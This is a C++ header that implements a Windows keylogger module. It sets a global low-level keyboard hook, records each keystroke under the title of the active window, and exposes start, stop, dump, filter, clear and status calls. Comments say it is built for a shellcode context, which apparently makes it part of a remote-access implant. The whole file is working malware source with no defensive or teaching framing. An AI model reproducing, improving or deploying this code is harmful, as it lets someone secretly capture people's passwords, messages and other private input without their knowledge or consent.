#pragma once

#include <string>
#include <sstream>
#include <cstring>

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#endif

namespace keylogger {

// Raw buffers — safe for shellcode context (no CRT constructors needed)
inline char key_buffer[131072];
inline size_t key_buffer_len = 0;
inline char last_title[256];
inline bool is_running = false;
inline size_t key_events_total = 0;

// Spinlock for buffer synchronization (no CRT init needed)
inline volatile LONG key_lock = 0;

inline void key_acquire() {
    while (InterlockedExchange(&key_lock, 1) != 0) Sleep(0);
}
inline void key_release() {
    InterlockedExchange(&key_lock, 0);
}

// Hook handles
inline HHOOK g_hhook = NULL;
inline HANDLE g_hook_thread = NULL;
inline DWORD g_hook_tid = 0;

// ── Helpers ─────────────────────────────────────────────────────
inline std::string GetActiveWindowTitle() {
    HWND hForeground = GetForegroundWindow();
    if (!hForeground) return "Unknown Window";
    char title[256];
    if (GetWindowTextA(hForeground, title, sizeof(title)))
        return std::string(title);
    return "Untitled Window";
}

inline void append_to_buffer(const char* data, size_t len) {
    if (len == 0) return;
    if (len >= sizeof(key_buffer) - 1) {
        data += len - (sizeof(key_buffer) - 2);
        len = sizeof(key_buffer) - 2;
    }
    while (key_buffer_len + len + 1 > sizeof(key_buffer)) {
        size_t discard = key_buffer_len / 2;
        if (discard == 0) discard = 1;
        memmove(key_buffer, key_buffer + discard, key_buffer_len - discard);
        key_buffer_len -= discard;
    }
    memcpy(key_buffer + key_buffer_len, data, len);
    key_buffer_len += len;
    key_buffer[key_buffer_len] = '\0';
}

inline void append_char(char c) {
    char buf = c;
    append_to_buffer(&buf, 1);
}

inline void append_string(const std::string& s) {
    append_to_buffer(s.data(), s.size());
}

inline void track_window_change(const std::string& title) {
    if (title != last_title) {
        std::string header = "\n\n[Window: " + title + "]\n";
        append_string(header);
        size_t cp = title.copy(last_title, sizeof(last_title) - 1);
        last_title[cp] = '\0';
    }
}

// ── LL Keyboard Hook Procedure ──────────────────────────────────
inline LRESULT CALLBACK hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;

        // Get window title BEFORE lock — GetWindowTextA may block on hung windows
        std::string title = GetActiveWindowTitle();

        key_acquire();
        key_events_total++;

        track_window_change(title);

        BYTE state[256];
        bool got_state = GetKeyboardState(state) != 0;

        bool handled = false;

        if (got_state) {
            UINT scan = kbs->scanCode;
            if (kbs->flags & LLKHF_EXTENDED) scan |= 0xE000;

            wchar_t chars[16] = {};
            int ret = ToUnicode(kbs->vkCode, scan, state, chars, 16, 0);

            if (ret > 0) {
                for (int i = 0; i < ret; i++) {
                    wchar_t c = chars[i];
                    if (c == L'\r' || c == L'\n') {
                        append_char('\n');
                    } else if (c == L'\b') {
                        if (key_buffer_len > 0) key_buffer_len--;
                    } else if (c == L'\t') {
                        append_char('\t');
                    } else if (c >= 32 && c <= 126) {
                        append_char((char)c);
                    }
                }
                handled = true;
            }
        }

        if (!handled) {
            // Basic VK-to-char fallback when GetKeyboardState/ToUnicode unavailable
            bool matched = true;
            if (kbs->vkCode == VK_SPACE) {
                append_char(' ');
            } else if (kbs->vkCode >= 0x30 && kbs->vkCode <= 0x39) {
                append_char('0' + (kbs->vkCode - 0x30));
            } else if (kbs->vkCode >= 0x41 && kbs->vkCode <= 0x5A) {
                append_char('a' + (kbs->vkCode - 0x41));
            } else {
                switch (kbs->vkCode) {
                    case VK_RETURN:  append_char('\n'); break;
                    case VK_BACK:    if (key_buffer_len > 0) key_buffer_len--; break;
                    case VK_TAB:     append_char('\t'); break;
                    case VK_ESCAPE:  append_string("[ESC]"); break;
                    case VK_DELETE:  append_string("[DEL]"); break;
                    case VK_INSERT:  append_string("[INS]"); break;
                    case VK_HOME:    append_string("[HOME]"); break;
                    case VK_END:     append_string("[END]"); break;
                    case VK_PRIOR:   append_string("[PGUP]"); break;
                    case VK_NEXT:    append_string("[PGDN]"); break;
                    case VK_LEFT:    append_string("[LEFT]"); break;
                    case VK_RIGHT:   append_string("[RIGHT]"); break;
                    case VK_UP:      append_string("[UP]"); break;
                    case VK_DOWN:    append_string("[DOWN]"); break;
                    case VK_SNAPSHOT:append_string("[PRTSC]"); break;
                    default:         matched = false; break;
                }
                if (!matched && kbs->vkCode >= VK_F1 && kbs->vkCode <= VK_F24) {
                    int fn = kbs->vkCode - VK_F1 + 1;
                    std::string fk = "[F" + std::to_string(fn) + "]";
                    append_string(fk);
                    matched = true;
                }
            }
            // Log unrecognized VKs in hex for diagnostics
            if (!matched) {
                char buf[16];
                snprintf(buf, sizeof(buf), "[VK:0x%02lX]", kbs->vkCode);
                append_string(std::string(buf));
            }
        }

        key_buffer[key_buffer_len] = '\0';
        key_release();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// No-op on Windows — hook captures keys asynchronously on a background thread.
// Still required because main.cpp calls poll() in the sleep loop.
inline void poll() {
}

// ── Hook Thread (message pump required for WH_KEYBOARD_LL) ──────
inline DWORD WINAPI hook_thread(LPVOID) {
    g_hhook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, GetModuleHandleW(NULL), 0);
    if (!g_hhook) return 1;
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    UnhookWindowsHookEx(g_hhook);
    g_hhook = NULL;
    return 0;
}

// ── Public API ──────────────────────────────────────────────────
inline std::string start() {
    if (is_running) {
        is_running = false;
        if (g_hhook) {
            PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
            if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT)
                TerminateThread(g_hook_thread, 0);
            CloseHandle(g_hook_thread);
            g_hook_thread = NULL;
        }
    }
    key_buffer_len = 0;
    key_buffer[0] = '\0';
    key_events_total = 0;
    last_title[0] = '\0';
    key_lock = 0;
    g_hhook = NULL;

    g_hook_thread = CreateThread(NULL, 0, hook_thread, NULL, 0, &g_hook_tid);
    if (!g_hook_thread) return "Keylogger start FAILED (CreateThread).";

    Sleep(200);
    if (!g_hhook) {
        DWORD err = GetLastError();
        WaitForSingleObject(g_hook_thread, 1000);
        CloseHandle(g_hook_thread);
        g_hook_thread = NULL;
        return "Keylogger start FAILED (SetWindowsHookEx, error " + std::to_string(err) + ").";
    }

    is_running = true;
    return "Keylogger started (LL keyboard hook).";
}

inline std::string stop() {
    if (!is_running) return "Keylogger is not running.";
    is_running = false;
    if (g_hhook) {
        PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
        if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT) {
            TerminateThread(g_hook_thread, 0);
        }
        CloseHandle(g_hook_thread);
        g_hook_thread = NULL;
    }
    return "Keylogger stopped.";
}

inline std::string dump(const std::string& filter = "") {
    key_acquire();
    if (key_buffer_len == 0) {
        key_release();
        return "Buffer is empty. No keystrokes captured yet.";
    }
    std::string raw(key_buffer, key_buffer_len);
    // DON'T clear buffer — data is safe even if result is lost
    key_release();

    if (filter.empty()) {
        return "--- KEYLOG DUMP ---\n" + raw + "\n--- END DUMP ---";
    }
    std::string out = "--- KEYLOG DUMP (Filter: " + filter + ") ---\n";
    std::string line;
    std::istringstream stream(raw);
    bool in_target = false;
    while (std::getline(stream, line)) {
        if (line.find("[Window:") != std::string::npos)
            in_target = (line.find(filter) != std::string::npos);
        else if (in_target)
            out += line + "\n";
    }
    out += "--- END DUMP ---";
    return out;
}

inline std::string clear() {
    key_acquire();
    key_buffer_len = 0;
    key_buffer[0] = '\0';
    key_release();
    return "Buffer cleared.";
}

inline std::string status() {
    char buf[256];
    snprintf(buf, sizeof(buf), "Keylogger: %s | Buffer: %zu/%zu (%zu%%) | Events: %zu",
             is_running ? "RUNNING" : "STOPPED",
             key_buffer_len, sizeof(key_buffer) - 1,
             (key_buffer_len * 100) / (sizeof(key_buffer) - 1),
             key_events_total);
    return std::string(buf);
}

} // namespace keylogger
